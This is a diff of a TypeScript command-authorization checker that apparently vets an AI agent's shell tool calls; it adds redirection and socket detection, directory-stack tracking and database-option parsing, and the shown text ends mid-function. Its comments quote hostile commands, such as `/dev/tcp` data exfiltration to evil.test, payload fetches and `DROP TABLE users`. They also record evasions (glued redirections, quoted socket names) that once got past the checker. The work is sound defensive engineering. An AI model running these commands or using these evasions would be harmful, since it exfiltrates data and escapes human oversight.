@@ -1,7 +1,7 @@
 // Evaluates a host tool call against the compiled authority table. Deterministic: no model involvement.
 import { homedir, tmpdir } from 'node:os';
 import { lstatSync, readFileSync, readdirSync, realpathSync, statSync, type Dirent } from 'node:fs';
-import { dirname, isAbsolute, join, sep } from 'node:path';
+import { dirname, isAbsolute, join, relative, sep } from 'node:path';
 import { shimScript, gitHooksDir, resolveHooksPath } from '../project/githooks.ts';
 import { packageRoot } from '../launcher/self.ts';
 import { git, gitConfigGet } from '../util/git.ts';
@@ -19,9 +19,11 @@ import {
   isDevPath,
   isDiscardDevice,
   isNetworkDevice,
+  networkDevice,
   lexicalPath,
   chdirPath,
   openedPath,
+  globMatches,
   pathCandidates,
   withPathCache,
   type PathCandidates,
@@ -1623,7 +1625,9 @@ function joinWords(words: readonly string[]): string {
 }
 
 function normalizeSegmentInner(segment: string): string[] {
-  let s = segment.trim();
+  // A redirection ends the word in front of it, whether or not the author left a space (see separateGluedRedirections):
+  // every matcher below reads the words of THIS text
+  let s = separateGluedRedirections(segment.trim());
   // `npx --package=<spec> -c "<benign>"` FETCHES and runs that package; the command after `-c` is a decoy, and
   // every layer below treats `npx` as transparent and `-c` as a carrier, so the acquisition vanished entirely.
   // A runner carrying `--package`/`-p` is NOT transparent: the head survives so the vocabulary can classify it.
@@ -1679,6 +1683,13 @@ function normalizeSegmentInner(segment: string): string[] {
   // remote side the command's INPUT — `cat 0< /dev/tcp/evil/80 > payload.sh` fetches a file EGO never read.
   for (const nm of s.matchAll(/\/dev\/(tcp|udp)\/([^/\s'"]+)\/([^/\s'"]+)/g))
     extra.push(`${MARK}net-redirect ${nm[1]} ${nm[2]} ${nm[3]}`);
+  // ...and the socket is the name the SHELL sees, so it is also read from the redirection's own target, with its quotes and
+  // escapes removed: `cat < /dev/"tcp"/evil.test/80` has no `/dev/tcp/` in its text, and bash opens one all the same (r11-200)
+  for (const target of scanRedirections(s).sockets) {
+    const nd = networkDevice(target);
+    const marker = nd === null ? null : `${MARK}net-redirect ${nd.proto} ${nd.host} ${nd.port}`;
+    if (marker !== null && !extra.includes(marker)) extra.push(marker);
+  }
   // Assignments that SELECT THE TARGET of a database or Kubernetes client are not noise: stripping them made
   // `PGHOST=prod-db psql -c "DROP TABLE users"` read as the local socket (round 14). They are re-attached below so
   // the target resolver sees them, and are judged nowhere else.
@@ -2075,8 +2086,14 @@ function normalizeTail(rest: string[]): string[] {
       return [`${head} <<<`, ...splitShellSegments(unquoteShellWord(rest[hereIdx + 1]!)).flatMap(normalizeSegment)];
     // `bash < script.sh` RUNS script.sh — the redirection names the program exactly as an operand would, and
     // reading it as an unclassified option left a workspace script unanalysed (exit review 5).
+    // ...but only when nothing else IS the program: `sh run.sh </dev/null` runs run.sh, with stdin as its DATA, and reading the
+    // redirection as the program dropped the script that was named (closure audit, cause-S)
     const fromFile = /(?:^|\s)<\s*([^\s<>|&;]+)/.exec(rest.join(' '));
-    if (fromFile && !STDIN_FILE_RE.test(fromFile[1]!) && fromFile[1] !== '-') return [`${head} ${fromFile[1]}`];
+    // (a redirection and its target are not operands: `bash < run.sh` has none)
+    const programOperands = rest
+      .map((_, at) => at)
+      .filter((at) => at >= sp.end && !/^\d*(?:<|>|>>|&>|<>|>\||>&)$/.test(rest[at - 1] ?? '') && !/^\d*(?:<|>|&>)/.test(rest[at]!));
+    if (fromFile && programOperands.length === 0 && !STDIN_FILE_RE.test(fromFile[1]!) && fromFile[1] !== '-') return [`${head} ${fromFile[1]}`];
   }
   // `trap 'CMD' EXIT` stores CMD and the shell runs it later: it is a carrier exactly like `sh -c`, and an
   // absolute core deny inside its quoted argument reached ASK (exit review 4).
@@ -2357,12 +2374,41 @@ export function stripToolGlobalOptions(head: string, tokens: string[]): { rest: 
   return { rest: tokens, extra, late };
 }
 
-/** Output redirection targets of a segment (`> f`, `>> f`, `2> f`, `&> f`), quotes removed; heredocs and fd dups excluded. */
-function scanRedirections(segment: string): { writes: string[]; reads: string[] } {
+/** What the ONE reader of redirections found in a segment. */
+interface RedirectionScan {
+  /** Output redirection targets (`> f`, `>> f`, `2> f`, `&> f`), quotes removed; heredocs, fd dups, discard devices and
+   *  sockets excluded. */
+  writes: string[];
+  /** the files an input redirection (`< FILE`) reads */
+  reads: string[];
+  /** the sockets a redirection opens (`/dev/tcp/HOST/PORT`), in either direction, as the word the shell sees: a quote in
+   *  `/dev/"tcp"/h/80` is removed before bash looks at the name (r11-200) */
+  sockets: string[];
+  /** where each redirection operator begins in the text that was scanned: a descriptor digit before it is not part of
+   *  it, and `<<`, `<<<` and `<&` are operators too. An operator that stands against the end of a word is where that
+   *  word ends (see separateGluedRedirections) */
+  operators: number[];
+  /** the extent of each redirection that names a word (`>/dev/null`, `2>&1`, `< in.txt`): from its operator to the end of
+   *  that word, in the text that was scanned. A here-document and a here-string are not here: their word is the command's
+   *  input, and the carriers read it */
+  spans: Array<[number, number]>;
+}
+
+/** THE READER OF A SEGMENT'S REDIRECTIONS - one tokenizer for the words that carry them, asked by the redirection targets
+ *  (the writes and reads the path rules judge), the socket detector (the network rule), and the word splitter that ends a
+ *  word at the operator glued to it. The questions used to be answered by three readers of their own: a regular expression
+ *  over the raw text for `/dev/tcp` (which a quote inside the name defeated), `commandWords` for the head of the command
+ *  (which sees `-delete>/dev/null` as two words) and the normalizer, which tokenized on white space only and so kept
+ *  `-delete>/dev/null` as ONE, and no matcher that needs a word boundary after a flag matched it (r11-6, r11-7).
+ *  `keepContinuations` leaves a backslash-newline where it stands, for the caller that wants the offsets of the text it gave. */
+function scanRedirections(segment: string, keepContinuations = false): RedirectionScan {
   const out: string[] = [];
   const reads: string[] = [];
+  const sockets: string[] = [];
+  const operators: number[] = [];
+  const spans: Array<[number, number]> = [];
   // a backslash-newline continuation is erased by the shell before it opens the file, so erase it first too
-  const t = segment.replace(/\\\r?\n/g, '');
+  const t = keepContinuations ? segment : segment.replace(/\\\r?\n/g, '');
   // THE SCAN IS QUOTE-AWARE. A `>` inside a quoted argument is text - `git commit -m "docs: why > control-plane/x.md is
   // refused"` writes nothing - and a regex over the whole segment could not tell (exit review 10). Quotes, escapes,
   // substitutions and process substitutions are skipped as the units they are; the operator is recognised only at
@@ -2410,6 +2456,8 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
     }
     // an INPUT redirection reads a file: `mysql </tmp/payload` feeds it a script. (`<<` and `<<<` carry text, `<(` a command.)
     if (c === '<' && t[i + 1] !== '<' && t[i + 1] !== '(' && t[i + 1] !== '>' && t[i + 1] !== '&') {
+      // (the second and third `<` of `<<` and `<<<` come through here as well; the operator began at the first)
+      if (t[i - 1] !== '<') operators.push(i);
       let k = i + 1;
       while (k < t.length && isIfs(t[k]!)) k++;
       const st = k;
@@ -2425,10 +2473,13 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
         } else k++;
       }
       const w = t.slice(st, Math.min(k, t.length));
+      if (t[i - 1] !== '<') spans.push([i, Math.min(k, t.length)]);
       if (w) {
         const src = unquoteShellWord(w);
+        // `cat < /dev/tcp/HOST/PORT` makes the remote side the command's INPUT: judged by the network, not as a file
+        if (isNetworkDevice(src)) sockets.push(src);
         // a device NAME is not file content, but an open descriptor above 2 (`/dev/fd/3`) is whatever an earlier line opened
-        if (!src.startsWith('&') && !(isDevPath(src) && descriptorAlias(src) === null)) reads.push(src);
+        else if (!src.startsWith('&') && !(isDevPath(src) && descriptorAlias(src) === null)) reads.push(src);
       }
       i = Math.max(k, i + 1);
       continue;
@@ -2448,45 +2499,131 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
       if (t[j] === '>') j++;
       if (t[j] === '|') j++;
     } else if (c === '<' && t[i + 1] === '>') j = i + 2;
+    // `<<`, `<<<` and `<&` carry text or a descriptor and name no file here, but they are operators: the word in front of
+    // them ends where they begin
+    if (j < 0 && c === '<' && (t[i + 1] === '<' || t[i + 1] === '&') && t[i - 1] !== '<') operators.push(i);
     if (j < 0) {
       i++;
       continue;
     }
-    while (j < t.length && isIfs(t[j]!)) j++;
+    operators.push(i);
+    // zsh's `>|` and `>!` (and `>>!`, `&>!`, `>&!`, `>&|`) FORCE the overwrite of an existing file, and the file is the word that
+    // follows. bash has no `!` there: it is the first character of the file's NAME (`echo a >! f` writes a file called `!`). The
+    // word after the `!` is therefore judged as well as the one the `!` begins: the line is run by whichever shell the host
+    // has, and `echo x >! /etc/hosts`, `&>! ~/.zshrc` were ALLOW because only the second reading was made
+    if (dup && t[j] === '|') j++;
     // the target word: quoted and unquoted chunks, up to the shell's own separators
-    const start = j;
-    while (j < t.length && !isIfs(t[j]!) && t[j] !== ';' && t[j] !== '&' && t[j] !== '|') {
-      const d = t[j]!;
-      if (d === '\\') j += 2;
-      else if (d === "'") {
-        const e = skipSingleQuoted(t, j + 1);
-        j = e < 0 ? t.length : e;
-      } else if (d === '"') {
-        const e = skipDoubleQuoted(t, j + 1);
-        j = e < 0 ? t.length : e;
-      } else if (d === '$' && t[j + 1] === "'") {
-        const e = skipAnsiC(t, j + 2);
-        j = e < 0 ? t.length : e;
-      } else if (d === '$' && t[j + 1] === '(') {
-        const e = scanSubstitutionBody(t, j + 2);
-        j = e < 0 ? t.length : e + 1;
-      } else j++;
+    const readWord = (from: number): number => {
+      let k = from;
+      while (k < t.length && !isIfs(t[k]!) && t[k] !== ';' && t[k] !== '&' && t[k] !== '|') {
+        const d = t[k]!;
+        if (d === '\\') k += 2;
+        else if (d === "'") {
+          const e = skipSingleQuoted(t, k + 1);
+          k = e < 0 ? t.length : e;
+        } else if (d === '"') {
+          const e = skipDoubleQuoted(t, k + 1);
+          k = e < 0 ? t.length : e;
+        } else if (d === '$' && t[k + 1] === "'") {
+          const e = skipAnsiC(t, k + 2);
+          k = e < 0 ? t.length : e;
+        } else if (d === '$' && t[k + 1] === '(') {
+          const e = scanSubstitutionBody(t, k + 2);
+          k = e < 0 ? t.length : e + 1;
+        } else k++;
+      }
+      return k;
+    };
+    const skipBlanks = (from: number): number => {
+      let k = from;
+      while (k < t.length && isIfs(t[k]!)) k++;
+      return k;
+    };
+    const start = skipBlanks(j);
+    j = readWord(start);
+    const words = [t.slice(start, Math.min(j, t.length))];
+    if (t[start] === '!') {
+      const forced = skipBlanks(start + 1);
+      const end = readWord(forced);
+      words.push(t.slice(forced, Math.min(end, t.length)));
+      j = Math.max(j, end);
     }
-    const word = t.slice(start, Math.min(j, t.length));
+    spans.push([i, Math.min(j, t.length)]);
     i = Math.max(j, i + 1);
-    if (!word) continue;
-    const target = unquoteShellWord(word);
-    if (dup && /^\d+$|^-$/.test(target)) continue; // fd duplication, not a file
-    if (target.startsWith('&')) continue;
-    // a discard device is not a write to a governed path - but only after `..` is resolved away, so that
-    // `/dev/../etc/x` is judged as `/etc/x` (round 13). Every OTHER path under /dev is a destination: the raw disk
-    // `echo x > /dev/disk0` used to be dropped with the null device. And `/dev/tcp/HOST/PORT` is a socket, judged by the
-    // network (the `net-redirect` marker), not as a file: `tar czf - . > /dev/tcp/evil.test/443` has no network binary
-    // anywhere on the line (exit review 7)
-    if (isDiscardDevice(target) || isNetworkDevice(target)) continue;
-    out.push(target);
+    for (const word of words) {
+      if (!word) continue;
+      const target = unquoteShellWord(word);
+      if (dup && /^\d+$|^-$/.test(target)) continue; // fd duplication, not a file
+      if (target.startsWith('&')) continue;
+      // a discard device is not a write to a governed path - but only after `..` is resolved away, so that
+      // `/dev/../etc/x` is judged as `/etc/x` (round 13). Every OTHER path under /dev is a destination: the raw disk
+      // `echo x > /dev/disk0` used to be dropped with the null device. And `/dev/tcp/HOST/PORT` is a socket, judged by the
+      // network (the `net-redirect` marker), not as a file: `tar czf - . > /dev/tcp/evil.test/443` has no network binary
+      // anywhere on the line (exit review 7)
+      if (isNetworkDevice(target)) {
+        sockets.push(target);
+        continue;
+      }
+      if (isDiscardDevice(target)) continue;
+      out.push(target);
+    }
   }
-  return { writes: out, reads };
+  return { writes: out, reads, sockets, operators, spans };
+}
+
+/** THE COMMAND WITHOUT ITS REDIRECTIONS - what a matcher that describes the ACT should read. `git checkout .` discards the
+ *  working tree and its matcher ends at the end of the line (`\s*$`); a redirection after it (`git checkout . >/dev/null`, or
+ *  glued) is not part of the act, and a matcher that wanted the end of the line did not find it (r11-7). The redirections
+ *  themselves are judged where they belong: the path rules read their targets, the network rule their sockets. A descriptor
+ *  that stands alone in front of an operator (`2>&1`) goes with it. */
+function stripRedirections(text: string): string {
+  if (!/[<>]/.test(text)) return text;
+  const { spans } = scanRedirections(text, true);
+  if (spans.length === 0) return text;
+  let out = text;
+  for (const [from, to] of [...spans].sort((a, b) => b[0] - a[0])) {
+    let start = from;
+    let q = from;
+    while (q > 0 && /[0-9]/.test(out[q - 1]!)) q--;
+    if (q < from && (q === 0 || /[\s;&|({<>]/.test(out[q - 1]!))) start = q;
+    out = `${out.slice(0, start)} ${out.slice(to)}`;
+  }
+  return out.trim();
+}
+
+/** THE WORD IN FRONT OF A REDIRECTION OPERATOR ENDS WHERE THE OPERATOR BEGINS, however little white space the author left. The
+ *  shell reads `find . -delete>/dev/null` as the word `-delete` and a redirection; a reader that tokenizes on white space
+ *  alone read ONE word, `-delete>/dev/null`, and every matcher and every reader of a flag that wants the end of a word after
+ *  it (`-f`, `-delete`, `--force`) found nothing: `find . -type f -delete>/dev/null` and `git checkout -f>/dev/null` were
+ *  ALLOW while the same commands with a space were ASK, and `ls>/dev/null` was an unknown command (r11-6, r11-7). A descriptor
+ *  that stands alone in front of the operator (`2>&1`) belongs to it, and is left where it is. The operators are the
+ *  scanner's own (scanRedirections): quoted, escaped and substituted text is never touched. */
+function separateGluedRedirections(text: string): string {
+  if (!/[<>]/.test(text)) return text;
+  const at = scanRedirections(text, true).operators;
+  if (at.length === 0) return text;
+  let out = text;
+  for (const p of [...at].sort((a, b) => b - a)) {
+    // a here-string's text is the word AFTER its operator: `bash<<<'git push'` is the script `git push`, and the readers of a
+    // here-string take the next word whole, which a glued one is not
+    if (out.startsWith('<<<', p) && p + 3 < out.length && !/\s/.test(out[p + 3]!)) out = `${out.slice(0, p + 3)} ${out.slice(p + 3)}`;
+    else if (!out.startsWith('<<', p)) {
+      // ...and a target that STARTS with a quote is its own word: `>"/dev/null"` tokenizes as ONE quoted word, which hides the
+      // operator from the readers that cut a word at one (`cd control-plane >"/dev/null"` was a `cd` with two operands). A
+      // here-document's delimiter keeps its quote - whether it is quoted decides whether the body expands
+      let e = p;
+      while (e < out.length && /[<>&|!]/.test(out[e]!)) e++;
+      if (e > p && /['"]/.test(out[e] ?? '')) out = `${out.slice(0, e)} ${out.slice(e)}`;
+    }
+    const before = out[p - 1];
+    if (before === undefined || /[\s;&|({]/.test(before)) continue;
+    // a run of digits that is a word by itself is the descriptor of this operator: the word ends in front of THEM
+    let q = p;
+    while (q > 0 && /[0-9]/.test(out[q - 1]!)) q--;
+    if (q < p && (q === 0 || /[\s;&|(){}<>]/.test(out[q - 1]!))) continue;
+    out = `${out.slice(0, p)} ${out.slice(p)}`;
+  }
+  return out;
 }
 
 export function redirectionTargets(segment: string): string[] {
@@ -2975,7 +3112,7 @@ interface StatementHead {
   viaCommand: boolean;
 }
 function statementHead(text: string): StatementHead {
-  const t = commandWords(tokenizeMarked(expandBraces(text))).map((x) => x.text);
+  const t = commandWords(tokenizeMarked(separateGluedRedirections(expandBraces(text)))).map((x) => x.text);
   let i = 0;
   let bypass = false;
   let viaCommand = false;
@@ -3349,7 +3486,7 @@ export function cwdTimeline(
   let mayStop = false;
   for (let i = 0; i < stages.length; i++) {
     const st = stages[i]!;
-    const text = expandBraces(st.text).trim();
+    const text = separateGluedRedirections(expandBraces(st.text)).trim();
     if (st.text.startsWith(`${FUNCTION_DEF_PREFIX} `)) {
       fnDepth++;
       out.push({ dirs: [...now].filter((d) => d !== CWD_UNKNOWN), unknown: now.has(CWD_UNKNOWN), dynamicCd: false });
@@ -3402,6 +3539,12 @@ export function cwdTimeline(
     // stage after it, which is wrong for a group. The LAST stage of a pipeline can: bash forks it, zsh does not, so it
     // is conditional
     const lastOfPipeline = st.pipedFromPrevious || st.lastOfPipe === true;
+    // `dirs -c` EMPTIES THE STACK that a later `popd` would take its directory from: `pushd control-plane; dirs -c; popd` stays in
+    // control-plane (the pop fails), where a stack the model still held would send it back
+    {
+      const listing = statementHead(text);
+      if (listing.verb === 'dirs' && listing.args.some((a) => /^-[a-zA-Z]*c/.test(a))) stackAmbiguous = true;
+    }
     const dc = directoryChange(text);
     // ...and whether `cd` is a function here: certainly (then it is a no-op), maybe (then it may or may not move), or not
     const fnHere = binds[i]!;
@@ -3440,7 +3583,29 @@ export function cwdTimeline(
         const physical = opts.some((o) => /^-[a-zA-Z]*P/.test(o));
         const t = new Set<string>();
         let quietUnknown = false;
-        if (dc.verb === 'popd') {
+        // `pushd` AND `popd` EDIT THE DIRECTORY STACK, AND ONLY SOMETIMES MOVE. The model keyed on the builtin's NAME, so `pushd -n
+        // sub` - which puts `sub` on the stack and leaves the shell where it is - moved the working directory, and `tee
+        // control-plane/a.md` was resolved under `sub` (sa10-6). What they do is a property of the OPTION they are given:
+        //   -n          the stack changes, the directory does not
+        //   +N / -N     an entry is rotated to the top (pushd) or removed (popd): the directory is that entry's, which is not held
+        //   any other   bash rejects an option it does not know and stays; zsh takes `-q`, `-s`, `-L`, `-P` and goes - so it may
+        //               have moved, and may not
+        // Every case where the stack is edited by anything but a plain `pushd DIR` / bare `popd` leaves it unknown afterwards.
+        const isIndex = (a: string): boolean => /^[+-]\d+$/.test(a);
+        const stackOnly = dc.verb !== 'cd' && opts.some((o) => /^-[a-zA-Z]*n/.test(o));
+        const indexed = dc.verb !== 'cd' && dc.args.some((a, k) => (optionsEnded < 0 || k < optionsEnded) && isIndex(a));
+        if (dc.verb !== 'cd' && opts.some((o) => !isIndex(o) && !/^-[a-zA-Z]*n/.test(o))) {
+          conditional = true;
+          stackAmbiguous = true;
+        }
+        if (stackOnly) {
+          for (const d of now) t.add(d);
+          stackAmbiguous = true;
+        } else if (indexed) {
+          t.add(CWD_UNKNOWN);
+          quietUnknown = true;
+          stackAmbiguous = true;
+        } else if (dc.verb === 'popd') {
           const popped = operands.length === 0 && !stackAmbiguous ? stack.pop() : undefined;
           if (popped) for (const d of popped) t.add(d);
           else {
@@ -3465,7 +3630,7 @@ export function cwdTimeline(
           else if (!directoryExists(d)) certain = false;
         }
         // a `pushd` whose target may not exist may not push either, and then the stack is not what it looks like
-        if (dc.verb === 'pushd') {
+        if (dc.verb === 'pushd' && !stackOnly && !indexed) {
           if (certain) stack.push(new Set(now));
           else stackAmbiguous = true;
         }
@@ -3481,6 +3646,11 @@ export function cwdTimeline(
         for (const sub of splitShellPipeline(text0)) {
           const sdc = directoryChange(sub.text);
           if (!sdc) continue;
+          // (a sourced file's `pushd` and `popd` edit a stack this model does not follow into the file: wherever they leave the shell is unknown)
+          if (sdc.verb !== 'cd') {
+            t.add(CWD_UNKNOWN);
+            continue;
+          }
           const ops = sdc.args.filter((a) => !a.startsWith('-'));
           if (ops.length === 1 && ops[0] !== '-') for (const b of now) for (const r of resolveTarget(ops[0]!, b, false)) t.add(r);
           else t.add(CWD_UNKNOWN);
@@ -3676,7 +3846,19 @@ export function matchPathPattern(pattern: string, absPath: string, ctx: Evaluati
   );
 }
 
+/** A pattern is compiled once: the same few dozen protected-path globs are asked of every path a decision judges, and a wildcard
+ *  operand that matches a thousand names asks them a thousand times. (The expression carries no `g`/`y` flag, so it holds no state.) */
+const globRegExps = new Map<string, RegExp>();
+
 export function globToRegExp(glob: string): RegExp {
+  const known = globRegExps.get(glob);
+  if (known !== undefined) return known;
+  const compiled = compileGlob(glob);
+  if (globRegExps.size < 4096) globRegExps.set(glob, compiled);
+  return compiled;
+}
+
+function compileGlob(glob: string): RegExp {
   let re = '^';
   for (let i = 0; i < glob.length; i++) {
     const ch = glob[i]!;
@@ -3998,6 +4180,13 @@ const SECRET_FILE_NAMES: readonly string[] = [
   'server.pem',
   'private.key',
 ];
+
+/** Whether a path, relative to where a search starts, can be a credential: it passes through a hidden name, or it is named
+ *  like one. The names a catch-all glob is asked about - the rest of the tree is not a secret and is not classified. */
+function credentialShaped(rel: string): boolean {
+  const parts = rel.split(sep).filter((s) => s !== '' && s !== '.' && s !== '..');
+  return parts.some((s) => s.startsWith('.')) || SECRET_FILE_NAMES.includes(parts[parts.length - 1] ?? '');
+}
 
 /** A file-name glob (`.env*`, `*.{pem,key}`, `.e[n]v`) as a regular expression, or null when it is not one this
  *  can read. Only the last path segment: the caller has already split off the directory. */
@@ -7426,7 +7615,13 @@ function gitLocalProgramValues(root: string, verb: string, failed?: { value: boo
     const seen = new Set<string>();
     const follow = (file: string, depth: number): void => {
       const abs = canonicalPath(file);
-      if (depth > 4 || seen.has(abs)) return;
+      if (seen.has(abs)) return;
+      // A CHAIN DEEPER THAN THE WALK GOES IS NOT A CHAIN THAT ENDS: what the files below the cap configure was never read, so the
+      // closure is unproved, said the way an unanswered subprocess says it
+      if (depth > 4) {
+        if (failed) failed.value = true;
+        return;
+      }
       seen.add(abs);
       let text: string;
       try {
@@ -9068,6 +9263,19 @@ const DB_CLIENT_HEADS = new Set([
   // ordinary unknown commands (exit review 9).
   'flyway', 'liquibase', 'sqitch', 'alembic', 'dbmate', 'goose', 'atlas',
 ]);
+/** THE MIGRATION RUNNERS THAT ARE TOLD WHERE THEIR TARGET IS BY A NAME, and what the name is of. dbmate's `--env NAME` (`-e`)
+ *  names the VARIABLE that holds the database URL; knex, sequelize and atlas take the name of an ENVIRONMENT block of their own
+ *  configuration file. The name is data about the target and is read like one (resolveDbTarget); the value of a variable
+ *  that is not on the command line is the ambient environment, and asks. */
+const DB_NAMED_TARGET_OPTIONS: Readonly<Record<string, { short: string; long: readonly string[]; names: 'variable' | 'environment' }>> = {
+  dbmate: { short: 'e', long: ['--env'], names: 'variable' },
+  knex: { short: '', long: ['--env'], names: 'environment' },
+  sequelize: { short: '', long: ['--env'], names: 'environment' },
+  'sequelize-cli': { short: '', long: ['--env'], names: 'environment' },
+  atlas: { short: '', long: ['--env'], names: 'environment' },
+};
+/** the options that carry a connection STRING (the runners spell it `-url`/`--url`; Go-style single-dash forms are read as well) */
+const DB_URL_OPTIONS = ['--url', '--uri', '--dsn', '--database-url', '--db-url', '--jdbc-url', '--connection-string', '--dburl'];
 const DB_EXECUTES_UNREAD =
   // `\!` is psql's shell escape. Inside DOUBLE quotes the backslash is consumed before this test ever sees it,
   // so the de-escaped form — a `-c` value that BEGINS with `!` — is matched too. Matching a bare `!` anywhere
@@ -9931,36 +10139,6 @@ function looksLikeDbTarget(t: string): boolean {
   return /^[A-Za-z0-9][A-Za-z0-9.-]*\.[A-Za-z][A-Za-z0-9-]*(:\d+)?(\/\S*)?$/.test(t) && !/\.(sql|js|py|rb|json|txt)$/i.test(t);
 }
 
-/** Every statement a database client will RUN, from any flag it accepts - including the abbreviations its option
- *  parser accepts (`mysql --exe`, `psql --comm`) - and whether any came from a FILE, which nobody has read. */
-function dbStatements(tokens: string[]): { statements: string[]; fromFile: boolean } {
-  const LONGS = ['command', 'execute', 'eval', 'query', 'init-command', 'defaults-command', 'file', 'init-file', 'queries-file', 'execute-file'];
-  const FILES = new Set(['file', 'init-file', 'queries-file', 'execute-file']);
-  const statements: string[] = [];
-  let fromFile = false;
-  for (let i = 1; i < tokens.length; i++) {
-    const t = tokens[i]!;
-    if (t.startsWith('--') && t.length > 3) {
-      const eq = t.indexOf('=');
-      const name = t.slice(2, eq < 0 ? undefined : eq);
-      // an EXACT name is never ambiguous: `--execute` is not an abbreviation of `--execute-file`
-      const hit = LONGS.includes(name) ? [name] : LONGS.filter((l) => l.startsWith(name));
-      if (hit.length) {
-        // an ambiguous abbreviation is refused by the client, so ANY candidate that reads a file counts as one
-        const value = eq >= 0 ? t.slice(eq + 1) : tokens[i + 1];
-        if (hit.some((l) => FILES.has(l))) fromFile = true;
-        if (hit.some((l) => !FILES.has(l)) && value !== undefined) statements.push(value);
-        if (eq < 0) i++;
-        continue;
-      }
-    }
-  }
-  statements.push(...optionValues(tokens, 'c', []), ...optionValues(tokens, 'e', []));
-  if (optionValues(tokens, 'f', []).length) fromFile = true;
-  // the Go-style single-dash spellings were normalised to the double-dash ones by the caller
-  return { statements: [...new Set(statements)], fromFile };
-}
-
 /** The functions a SELECT may call and still be a read: pure in PostgreSQL and in MySQL alike, named in ONE place.
  *  A function that is not here is refused - `pg_terminate_backend`, `nextval`, `setval`, `lo_import`, `load_file`,
  *  `sleep`, `dblink`, `query_to_xml` and `openrowset` are SELECTs that act, and a list of the ones that do is wrong by
@@ -10269,12 +10447,14 @@ function parseDbArgs(args: readonly DbWord[], spec: DbOptionSpec): DbArgs {
   const out: DbArgs = { options: [], escaping: [], positional: [], unknown: [] };
   const longs = [...spec.value, ...spec.flag, ...(spec.escaping ?? [])];
   const takesValue = new Set(spec.value);
-  const resolve = (name: string): string | null => {
-    if (longs.includes(name)) return name;
-    if (!spec.abbreviate) return null;
-    // an abbreviation must name ONE option: the client refuses an ambiguous one, and so does this
-    const hits = longs.filter((l) => l.startsWith(name));
-    return hits.length === 1 ? hits[0]! : null;
+  // The options a written name may be. An EXACT name is never ambiguous (`--execute` is not short for `--execute-file`); an
+  // abbreviation that two options share is refused by the client - and read here as EVERY one of them, because the reading that
+  // lets a statement or a script through is the one a reader that refuses it too misses (`psql --fi=x.sql` is a file as much as
+  // it is a field separator): whatever it is, each candidate that carries something to run is judged as given.
+  const resolve = (name: string): string[] => {
+    if (longs.includes(name)) return [name];
+    if (!spec.abbreviate) return [];
+    return longs.filter((l) => l.startsWith(name));
   };
   const synthetic = (text: string): DbWord => ({ text, quoted: true, expands: false });
   for (let i = 0; i < args.length; i++) {
@@ -10297,17 +10477,21 @@ function parseDbArgs(args: readonly DbWord[], spec: DbOptionSpec): DbArgs {
     const rawName = eq < 0 ? whole : whole.slice(0, eq);
     const bare = spec.underscoreIsDash === true ? rawName.replace(/_/g, '-') : rawName;
     const glued = eq < 0 ? null : whole.slice(eq + 1);
-    const takeValue = (name: string): void => {
-      if (glued !== null) out.options.push({ name, value: { text: glued, quoted: w.quoted, expands: w.expands } });
-      else if (args[i + 1] !== undefined) out.options.push({ name, value: args[++i]! });
-      else out.options.push({ name, value: null });
-    };
     // `--name` and, for Go-style parsers, `-name`
-    const asLong = t.startsWith('--') || spec.singleDash === true ? resolve(bare) : null;
-    if (asLong !== null && (t.startsWith('--') || bare.length > 1)) {
-      if (spec.escaping?.includes(asLong)) out.escaping.push(asLong);
-      else if (takesValue.has(asLong)) takeValue(asLong);
-      else out.options.push({ name: asLong, value: glued === null ? null : synthetic(glued) });
+    const asLong = t.startsWith('--') || spec.singleDash === true ? resolve(bare) : [];
+    if (asLong.length > 0 && (t.startsWith('--') || bare.length > 1)) {
+      // the word takes a value when ANY candidate does; each candidate that takes one is given it, one that does not is given none
+      const valued = asLong.some((n) => takesValue.has(n) && !spec.escaping?.includes(n));
+      let value: DbWord | null = null;
+      if (valued) {
+        if (glued !== null) value = { text: glued, quoted: w.quoted, expands: w.expands };
+        else if (args[i + 1] !== undefined) value = args[++i]!;
+      }
+      for (const name of asLong) {
+        if (spec.escaping?.includes(name)) out.escaping.push(name);
+        else if (takesValue.has(name)) out.options.push({ name, value });
+        else out.options.push({ name, value: glued === null ? null : synthetic(glued) });
+      }
       continue;
     }
     if (t.startsWith('--')) {
@@ -11204,8 +11388,25 @@ function redisEscape(args: readonly DbWord[]): DbEscape {
 // real surface: its table functions read files, URLs, buckets, other servers and programs by design.
 const CLICKHOUSE_REACHING_OPTION = /^(pager|history-file|config-file|queries-file|query-file|server-logs-file|external|log-file|log-level-file|client-logs-file|ssh-key-file)$/;
 
+/** What a long option's name, as written, can be. ClickHouse parses its options with boost::program_options, which accepts
+ *  any prefix of a long name (`--que` is `--query`), a value glued with `=`, and `-` or `_` between words. An abbreviation
+ *  that two options share is refused by the client; here it is read as BOTH, because the other reading is the one that
+ *  hides a statement (sa10-34: the statement given by the SHORT option was the one nobody read). */
+function clickhouseLongName(written: string): { statement: boolean; file: boolean } {
+  const name = written.replace(/_/g, '-');
+  return {
+    statement: name !== '' && 'query'.startsWith(name),
+    // an EXACT name is never an abbreviation: `--query` is not short for `--query-file`
+    file: name !== 'query' && name.length >= 4 && ('queries-file'.startsWith(name) || 'query-file'.startsWith(name)),
+  };
+}
+/** the short options that take no value, so a cluster (`-nq 'select 1'`: boost allows them stuck together) goes on past them */
+const CLICKHOUSE_SHORT_FLAGS = 'ntvVEmM';
+
 function clickhouseEscape(args: readonly DbWord[]): DbEscape {
   const out: DbEscape = newDbEscape();
+  const reaches = (w: DbWord): void =>
+    void out.opaque.push(`the option ${w.text.split('=')[0]} names a program, a script, a configuration or a file`);
   const statement = (w: DbWord): void => {
     out.statements.push(w.text);
     if (w.expands) return void out.opaque.push('the statement is built at run time, so the text the client runs is not the text on the command line');
@@ -11221,15 +11422,82 @@ function clickhouseEscape(args: readonly DbWord[]): DbEscape {
       if (/[\s;]/.test(w.text)) statement(w);
       continue;
     }
-    const glued = /^-q(.+)$/.exec(w.text);
-    const name = w.text.replace(/^--?/, '').split('=')[0]!.replace(/_/g, '-');
-    if (glued && !w.text.startsWith('--')) statement({ text: glued[1]!, quoted: w.quoted, expands: w.expands });
-    else if (name === 'q' || name === 'query') {
+    if (w.text.startsWith('--')) {
       const eq = w.text.indexOf('=');
-      if (eq >= 0) statement({ text: w.text.slice(eq + 1), quoted: w.quoted, expands: w.expands });
-      else if (args[i + 1] !== undefined) statement(args[++i]!);
-    } else if (CLICKHOUSE_REACHING_OPTION.test(name) || (w.text === '-C' && !w.text.startsWith('--')))
